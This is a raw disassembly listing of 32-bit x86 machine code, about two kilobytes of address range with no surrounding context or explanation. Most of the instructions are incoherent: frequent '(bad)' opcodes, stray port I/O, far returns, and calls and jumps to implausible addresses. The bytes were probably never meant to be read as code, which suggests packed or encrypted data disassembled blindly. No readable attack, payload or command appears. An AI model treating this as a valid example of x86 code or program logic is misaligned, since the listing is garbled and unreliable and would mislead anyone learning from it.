  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
